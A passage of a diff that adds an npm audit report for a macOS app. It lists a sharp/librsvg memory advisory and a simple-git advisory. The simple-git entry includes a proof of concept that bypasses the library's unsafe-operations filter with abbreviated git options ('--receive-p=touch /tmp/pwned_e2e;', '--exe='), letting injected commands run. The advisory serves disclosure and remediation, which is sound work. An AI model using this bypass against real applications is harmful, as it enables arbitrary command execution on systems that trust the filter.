+      "url": "https://github.com/advisories/GHSA-g2v6-rqmx-r4w6"
+    },
+    "1241331": {
+      "findings": [
+        {
+          "version": "0.34.5",
+          "paths": [
+            "apps__macos>@huggingface/transformers>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-wq5f-xc86-pv6w\n- https://github.com/lovell/sharp/commit/96de105d9d36ab04c76c2b78b97255171630d236\n- https://github.com/lovell/sharp/releases/tag/v0.35.5\n- https://gitlab.gnome.org/GNOME/librsvg/-/work_items/1241\n- https://www.cve.org/CVERecord?id=CVE-2026-96889\n- https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+      "created": "2026-10-06T13:43:57.000Z",
+      "id": 1241331,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA memory-related vulnerability has been discovered and fixed in the upstream librsvg dependency. When certain runtime-specific conditions apply, this vulnerability can lead to possible remote code execution (RCE) on glibc-based Linux.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.5, which provides librsvg 2.63.2.\n\n#### Using a globally-installed librsvg?\n\nPlease ensure you are using the latest librsvg 2.63.2.\n\n### Workarounds\n\nAdd the following to your code to prevent sharp from decoding SVG images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadSvg\"] });\n```\n\nTo avoid RCE, ensure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already use this security-hardening feature however be warned that the \"official\" Node.js binaries do not.\n1",
+      "reported_by": null,
+      "title": "sharp : Vulnerability in librsvg dependency CVE-2026-96889",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.5",
+      "github_advisory_id": "GHSA-wq5f-xc86-pv6w",
+      "recommendation": "Upgrade to version 0.35.5 or later",
+      "patched_versions": ">=0.35.5",
+      "updated": "2026-10-06T13:43:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-416",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-wq5f-xc86-pv6w"
+    },
+    "1242216": {
+      "findings": [
+        {
+          "version": "3.36.0",
+          "paths": [
+            "apps__macos>node-llama-cpp>simple-git"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/steveukx/git-js/security/advisories/GHSA-858h-whjf-mvg5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102827\n- https://github.com/steveukx/git-js/pull/1193\n- https://github.com/steveukx/git-js/commit/98864c678444d9336357c844efa4fd5a7984c0d7\n- https://github.com/steveukx/git-js/releases/tag/simple-git@4.0.0\n- https://github.com/advisories/GHSA-858h-whjf-mvg5",
+      "created": "2026-10-05T23:47:58.000Z",
+      "id": 1242216,
+      "npm_advisory_id": null,
+      "overview": "simple-git's blockUnsafeOperationsPlugin blocks dangerous git options (--upload-pack/--receive-pack/--exec/...) unless the consumer opts in via unsafe:{allowUnsafePack:true}. Detection (@simple-git/argv-parser detectVulnerableFlags) matches the parsed flag NAME against literal-spelling patterns: /--(upload|receive)-pack/ (requires the literal '-pack') and the string '--exec'. But git accepts unambiguous prefix abbreviations of long options, and expandToken (token-expander.ts) returns the LITERAL token as flag.name (it uses the spec only for needsNext, never to canonicalize). So `git push --receive-p=<cmd>` parses with flag.name='--receive-p', which /--(upload|receive)-pack/ does NOT match, yet git expands --receive-p -> --receive-pack and runs <cmd> (on a local/file remote, locally). The clone side is robust (its '--u' substring rule catches every --upload* abbreviation); the push --receive-* and --exe* abbreviations have no equivalent rule and slip through.\n\nProof of concept (latest: simple-git 3.36.0, @simple-git/argv-parser 1.1.1, default unsafe plugin ON):\nGate vulnerabilityCheck: 'push --receive-pack=touch...' -> BLOCKED; 'push --receive-pa=touch...' and 'push --receive-p=touch...' -> BYPASS (empty vulns); '--exec=' BLOCKED, '--exe=' BYPASS.\nEnd-to-end via simpleGit().push():\n  CONTROL git.push(['../bare','HEAD:refs/heads/c','--receive-pack=touch /tmp/pwned_ctrl;']) -> throws GitPluginError 'Use of --upload-pack or --receive-pack is not permitted...'; no command runs.\n  BYPASS  git.push(['../bare','HEAD:refs/heads/e2e','--receive-p=touch /tmp/pwned_e2e;']) -> NO GitPluginError; /tmp/pwned_e2e CREATED (git executed the injected command); only a later GitError surfaces.\nDirect git confirms `git push ../bare --receive-p='touch X;' HEAD:refs/heads/m` and `--exe='touch Y;'` both execute on a local/path remote.\n\nImpact: any app relying on simple-git's default unsafe-operations protection while passing attacker-influenced options/args into a git push (local/file remote, or attacker-influenced receive-pack target) can be made to execute arbitrary commands -- the exact protection CVE-2026-28291 provided, defeated by an abbreviated spelling. Same class/impact as GHSA-jcxm-m3jx-f287, on the push path.\n\nRemediation: canonicalize git option abbreviations before matching (resolve to the canonical long name via the per-task flag spec in expandToken), or match on the option stem/prefix down to the shortest unambiguous form for push receive-pack/exec (mirroring the clone-side '--u' approach). Also audit --template and -c/config-write detection for the same abbreviation gap.\n\nCredit: anir0y (independent security research).",
+      "reported_by": null,
+      "title": "simple-git: unsafe-operations plugin bypass via git long-option abbreviation (--receive-p/--exe) -> command execution (residual of CVE-2026-28291)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102827"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "simple-git",
+      "vulnerable_versions": "<=3.36.0",
+      "github_advisory_id": "GHSA-858h-whjf-mvg5",
+      "recommendation": "Upgrade to version 4.0.0 or later",
+      "patched_versions": ">=4.0.0",
+      "updated": "2026-10-13T04:52:47.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-77",
+        "CWE-88"
+      ],
+      "url": "https://github.com/advisories/GHSA-858h-whjf-mvg5"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 6,
+      "high": 16,
+      "critical": 3
+    },
+    "dependencies": 271,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 271
+  }
+}
